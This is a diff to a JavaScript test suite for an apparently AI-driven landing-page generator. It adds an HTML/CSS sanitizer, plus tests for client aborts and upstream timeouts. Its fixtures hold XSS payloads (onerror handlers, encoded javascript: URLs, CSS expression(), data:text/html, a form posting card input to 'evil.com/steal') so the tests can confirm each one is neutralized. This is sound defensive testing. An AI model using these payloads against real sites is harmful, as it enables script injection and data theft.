@@ -15,6 +15,7 @@ process.env.DATABASE_URL = 'postgres://puure@127.0.0.1:5433/puure_shoporder';
 process.env.NODE_ENV = 'development';
 process.env.MONEY_SWEEP_DISABLED = '1';
 process.env.ANTHROPIC_API_KEY = 'test-key-not-real';
+process.env.AI_GENERATE_CALL_TIMEOUT_MS = '1500'; // exercise the timeout path fast
 process.env.JWT_SECRET = process.env.JWT_SECRET || 'test-secret';
 process.env.JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET || 'test-secret-2';
 
@@ -44,12 +45,17 @@ const ARCH = {
 const SECTION_HTML = [
   // fenced on purpose — exercises the unfence path; carries the image contract
   '```html\n<section style="padding:40px"><h1>SleepReset</h1><div class="lb-ai-image" data-ai-image-prompt="A tired mom holding a warm cup, soft morning light, photorealistic" data-aspect="4:5" style="background:#f1f5f9;border:1px dashed #cbd5e1">Click to generate image</div></section>\n```',
-  // scripts on purpose — must arrive stripped
-  '<section><h2>Why melatonin fails</h2><script>alert("evil")</script><p>Reason one</p><script src="https://evil.example/x.js"></script></section>',
-  '<section><h3>FAQ</h3><p>60-day guarantee.</p></section>',
+  // hostile on purpose — script + onerror + javascript: must all be neutralized
+  '<section><h2>Why melatonin fails</h2><script>alert("evil")</script><p>Reason one</p><img src=x onerror=alert(1)><a href="javascript:alert(1)">Buy now</a><script src="https://evil.example/x.js"></script></section>',
+  // benign kitchen sink — must come through visually intact (no over-stripping)
+  '<section style="padding:2rem;background:#fff"><h3>FAQ</h3><p>60-day guarantee.</p><a href="https://trypuure.co/buy" target="_blank" rel="noopener">Shop</a><img src="https://cdn.example.com/x.jpg" srcset="https://cdn.example.com/x.jpg 1x, https://cdn.example.com/y.jpg 2x" alt="product"><img src="data:image/png;base64,iVBORw0KGgo=" alt="inline"><style>.faq{color:#333;background:url(https://cdn.example.com/bg.png)}</style></section>',
 ];
 
-const mockCalls = { arch: 0, sections: 0 };
+const mockCalls = { arch: 0, sections: 0, aborts: 0 };
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+// SLOW_SECTIONS briefs delay each section 600ms (abort test); HANG_SECTION
+// briefs delay 5s — past the 1.5s harness timeout (timeout test).
+const delayFor = (txt) => (/HANG_SECTION/.test(txt) ? 5000 : /SLOW_SECTIONS/.test(txt) ? 600 : 0);
 
 const mockServer = http.createServer((req, res) => {
   let raw = '';
@@ -85,12 +91,21 @@ const mockServer = http.createServer((req, res) => {
         error: { type: 'invalid_request_error', message: 'mock section failure' },
       });
     }
-    return respond(200, {
-      id: `msg_s${idx}`, type: 'message', role: 'assistant', model: body.model,
-      content: [{ type: 'text', text: SECTION_HTML[idx] ?? '<section>fallback</section>' }],
-      stop_reason: 'end_turn', stop_sequence: null,
-      usage: { input_tokens: 200, output_tokens: 300 },
+    // Count upstream aborts: the SDK tearing the socket down (client-close
+    // propagation or its own timeout) closes the request before we respond.
+    let tornDown = false;
+    res.on('close', () => {
+      if (!res.writableEnded) { tornDown = true; mockCalls.aborts += 1; }
     });
+    return setTimeout(() => {
+      if (tornDown) return;
+      respond(200, {
+        id: `msg_s${idx}`, type: 'message', role: 'assistant', model: body.model,
+        content: [{ type: 'text', text: SECTION_HTML[idx] ?? '<section>fallback</section>' }],
+        stop_reason: 'end_turn', stop_sequence: null,
+        usage: { input_tokens: 200, output_tokens: 300 },
+      });
+    }, delayFor(String(userText)));
   });
 });
 await new Promise((r) => mockServer.listen(0, '127.0.0.1', r));
@@ -100,7 +115,9 @@ process.env.ANTHROPIC_BASE_URL = `http://127.0.0.1:${mockServer.address().port}`
 // Import the route AFTER the env is staged
 // ---------------------------------------------------------------------------
 const routeModule = await import('../../src/routes/aiPageGenerate.js');
-const { generateHandler, stripScripts, extractImageSlots, MODEL_ALLOWLIST } = routeModule;
+const {
+  generateHandler, sanitizeGeneratedHtml, sanitizeCss, extractImageSlots, MODEL_ALLOWLIST,
+} = routeModule;
 const realRouter = routeModule.default;
 
 // Harness app: stub auth + exported handler (real router keeps authenticate).
@@ -141,14 +158,74 @@ const readNdjson = async (res) => {
 };
 
 // ---------------------------------------------------------------------------
-// Unit: stripScripts + extractImageSlots
+// Unit: sanitizeGeneratedHtml — one assertion per reviewed injection vector
 // ---------------------------------------------------------------------------
+const san = (s) => sanitizeGeneratedHtml(s).html;
 {
-  const { html, removed } = stripScripts(
-    '<div><script>1</script><script src="x"/><script >tail</div>'
-  );
-  check('stripScripts removes closed, self-closed and unclosed scripts', removed === 3 && !/<script/i.test(html));
-  check('stripScripts keeps surrounding markup', /^<div><\/div>$/.test(html.replace('tail', '').trim()) || html.includes('<div>'));
+  // <script> family (kept from v1)
+  const scripts = san('<div><script>1</script><script src="x"/><script >tail</div>');
+  check('vector: <script> closed/self-closed/unclosed all removed', !/<script/i.test(scripts) && scripts.includes('<div>'));
+
+  // on* handlers — every quoting style, incl. the whitespace trick
+  const onerr = san('<img src=x onerror=alert(1)>');
+  console.log(`  before: <img src=x onerror=alert(1)>\n  after:  ${onerr}`);
+  check('vector: <img onerror> (unquoted) stripped, img + src kept',
+    !/onerror/i.test(onerr) && /<img /.test(onerr) && /src="x"/.test(onerr), onerr);
+  const onerrWs = san('<img src="x" onerror = "alert(1)" ONLOAD=\'x()\'>');
+  check('vector: `onerror = ` whitespace trick + uppercase ONLOAD stripped',
+    !/onerror|onload/i.test(onerrWs) && /src="x"/.test(onerrWs), onerrWs);
+  const svg = san('<svg onload=alert(1)><circle cx="1"/></svg>');
+  check('vector: <svg onload> stripped, svg kept', !/onload/i.test(svg) && /<svg>/.test(svg) && /circle/.test(svg), svg);
+
+  // javascript: URLs — plain + entity-encoded + control chars
+  const jsHref = san('<a href="javascript:alert(1)">x</a>');
+  console.log(`  before: <a href="javascript:alert(1)">x</a>\n  after:  ${jsHref}`);
+  check('vector: javascript: href dropped, <a> kept', !/javascript:/i.test(jsHref) && /<a>x<\/a>/.test(jsHref), jsHref);
+  const jsEnt = san('<a href="jav&#x61;script:alert(1)">x</a>');
+  check('vector: entity-encoded javascript: href dropped', !/href/i.test(jsEnt), jsEnt);
+  const jsTab = san('<a href="java\tscript:alert(1)">x</a>');
+  check('vector: control-char javascript: href dropped', !/href/i.test(jsTab), jsTab);
+
+  // element removals
+  check('vector: <iframe> removed with content', san('<p>a</p><iframe src="https://evil.com">fallback</iframe><p>b</p>') === '<p>a</p><p>b</p>');
+  check('vector: <object>/<embed> removed', !/object|embed/i.test(san('<object data="x">o</object><embed src="x">')));
+  check('vector: <base> removed', !/base/i.test(san('<base href="https://evil.com/">')));
+  const form = san('<form action="https://evil.com/steal"><input name="cc"><button>Go</button></form>');
+  check('vector: <form> unwrapped — action gone, children kept',
+    !/<form|action=/i.test(form) && /<input name="cc">/.test(form) && /<button>Go<\/button>/.test(form), form);
+
+  // CSS-side vectors
+  const styleEl = san('<style>a{background:url(javascript:alert(1));width:expression(alert(1))}</style>');
+  check('vector: <style> url(javascript:) + expression() neutralized',
+    !/javascript:/i.test(styleEl) && !/expression\s*\(/i.test(styleEl) && /<style>/.test(styleEl), styleEl);
+  const styleAttr = san('<div style="background:url( javascript:alert(1) );color:red">x</div>');
+  check('vector: style="" url(javascript:) neutralized, benign CSS kept',
+    !/javascript:/i.test(styleAttr) && /color:red/.test(styleAttr), styleAttr);
+
+  // data: URLs — image-only, src-side only
+  check('vector: data:text/html src dropped', !/src/i.test(san('<img src="data:text/html;base64,PHNjcmlwdD4=">')));
+  check('benign: data:image src kept', /src="data:image\/png;base64,AAA"/.test(san('<img src="data:image/png;base64,AAA">')));
+  check('vector: data:image in href still dropped (image-only is src-side)', !/href/i.test(san('<a href="data:image/png;base64,AAA">x</a>')));
+  const srcset = san('<img srcset="javascript:alert(1) 1x, https://cdn.example.com/y.jpg 2x">');
+  check('vector: srcset filtered per-entry', !/javascript:/i.test(srcset) && /https:\/\/cdn\.example\.com\/y\.jpg 2x/.test(srcset), srcset);
+
+  // lb-ai-image contract survival
+  const slot = '<div class="lb-ai-image" data-ai-image-prompt="A tired mom, soft light" data-aspect="4:5" style="background:#f1f5f9">Click to generate image</div>';
+  check('lb-ai-image contract survives sanitization byte-preserved', san(slot) === slot, san(slot));
+
+  // benign kitchen sink — nothing over-stripped
+  const benign = SECTION_HTML[2];
+  const kept = san(benign);
+  check('benign kitchen sink: links/imgs/srcset/style block intact',
+    /href="https:\/\/trypuure\.co\/buy"/.test(kept) && /target="_blank"/.test(kept)
+    && /src="https:\/\/cdn\.example\.com\/x\.jpg"/.test(kept)
+    && /srcset="https:\/\/cdn\.example\.com\/x\.jpg 1x, https:\/\/cdn\.example\.com\/y\.jpg 2x"/.test(kept)
+    && /url\(https:\/\/cdn\.example\.com\/bg\.png\)/.test(kept)
+    && /data:image\/png;base64,iVBORw0KGgo=/.test(kept)
+    && /60-day guarantee/.test(kept),
+    kept);
+
+  check('sanitizeCss exported + standalone', sanitizeCss('a{width:expression(x)}') === 'a{width:blocked(x)}');
 
   const slots = extractImageSlots(
     '<div class="lb-ai-image" data-ai-image-prompt="a cat" data-aspect="1:1">x</div><div class="lb-ai-image" data-ai-image-prompt=\'a dog\'>y</div>'
@@ -197,8 +274,17 @@ try {
 
   const s1 = sectionEvents[1];
   check('mock section containing <script> arrives script-stripped', !/<script/i.test(s1.html), s1.html.slice(0, 200));
-  check('script-stripped section keeps its real content', /Reason one/.test(s1.html) && /Why melatonin fails/.test(s1.html));
+  check('streamed section arrives with onerror stripped', !/onerror/i.test(s1.html), s1.html.slice(0, 250));
+  check('streamed section arrives with javascript: href dropped', !/javascript:/i.test(s1.html) && /<a>Buy now<\/a>/.test(s1.html), s1.html.slice(0, 250));
+  check('sanitized section keeps its real content', /Reason one/.test(s1.html) && /Why melatonin fails/.test(s1.html));
   check('no images on imageless section', Array.isArray(s1.images) && s1.images.length === 0);
+
+  const s2 = sectionEvents[2];
+  check('streamed benign kitchen sink not over-stripped',
+    /href="https:\/\/trypuure\.co\/buy"/.test(s2.html)
+    && /srcset="https:\/\/cdn\.example\.com\/x\.jpg 1x, https:\/\/cdn\.example\.com\/y\.jpg 2x"/.test(s2.html)
+    && /url\(https:\/\/cdn\.example\.com\/bg\.png\)/.test(s2.html),
+    s2.html.slice(0, 300));
 
   const last = events[events.length - 1];
   check('stream ends with done event', last?.type === 'done' && last.total === 3, JSON.stringify(last));
@@ -226,6 +312,49 @@ if (pagesBefore != null) {
   check('failure emits an error event and ends the stream', errorEvents.length === 1 && events[events.length - 1].type === 'error', JSON.stringify(events.map((e) => e.type)));
   check('no done event after mid-run failure', !events.some((e) => e.type === 'done'));
   check('error names the failed section + usable partials', /Section 2/.test(errorEvents[0]?.error || '') && /1 finished section/.test(errorEvents[0]?.error || ''), errorEvents[0]?.error);
+}
+
+// ---------------------------------------------------------------------------
+// 3b. Client disconnect aborts the in-flight Anthropic call
+// ---------------------------------------------------------------------------
+{
+  const before = { sections: mockCalls.sections, aborts: mockCalls.aborts };
+  const ctrl = new AbortController();
+  const res = await fetch(`${BASE}/page`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ brief: 'SLOW_SECTIONS — a page whose sections dawdle.' }),
+    signal: ctrl.signal,
+  });
+  // Read until the architecture lands (section 1 is now in flight), then hang up.
+  const reader = res.body.getReader();
+  const decoder = new TextDecoder();
+  let buf = '';
+  for (;;) {
+    const { done, value } = await reader.read();
+    if (done) break;
+    buf += decoder.decode(value, { stream: true });
+    if (buf.includes('"architecture"')) break;
+  }
+  ctrl.abort();
+  await sleep(2000); // give the abort time to propagate + prove no more calls
+  const sectionsMade = mockCalls.sections - before.sections;
+  check('client abort tears down the in-flight upstream call', mockCalls.aborts > before.aborts, `aborts ${before.aborts} -> ${mockCalls.aborts}`);
+  check('no further section calls after client abort', sectionsMade <= 2, `made ${sectionsMade}`);
+}
+
+// ---------------------------------------------------------------------------
+// 3c. Hung upstream → per-call timeout → clean error event naming the phase
+// ---------------------------------------------------------------------------
+{
+  const t0 = Date.now();
+  const res = await postPage({ brief: 'HANG_SECTION — section one never answers.' });
+  const events = await readNdjson(res);
+  const err = events.find((e) => e.type === 'error');
+  check('hung section → error event (not a hung stream)', Boolean(err), JSON.stringify(events.map((e) => e.type)));
+  check('timeout error names the phase + window', /Section 1 .* timed out after 2s/.test(err?.error || ''), err?.error);
+  check('timeout fired in bounded time (2 attempts of 1.5s + backoff)', Date.now() - t0 < 15_000, `${Date.now() - t0}ms`);
+  check('no done event after timeout', !events.some((e) => e.type === 'done'));
 }
 
 // ---------------------------------------------------------------------------
